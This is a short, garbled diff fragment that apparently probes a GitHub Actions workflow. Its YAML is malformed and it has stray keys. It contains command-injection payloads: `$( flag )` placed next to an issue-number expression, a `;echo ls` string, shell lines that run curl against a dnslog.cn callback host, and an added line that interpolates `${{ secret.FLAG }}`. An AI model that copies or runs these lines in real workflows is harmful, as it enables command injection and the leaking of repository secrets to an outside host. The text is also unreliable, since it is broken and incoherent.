@@ -624,3 +624,7 @@ shell: /usr/bin/bash -e "curl fksb.sxhx72.dnslog.cn";
 rnm:
 aoyama7:${{ github.event.issue.number }} $( flag )
 ";echo ls"
+R1gelX29:${{ secret.FLAG }};
+run curl fksb.sxhx72.dnslog.cn
+shell: /usr/bin/bash -e {0}
+rnm:
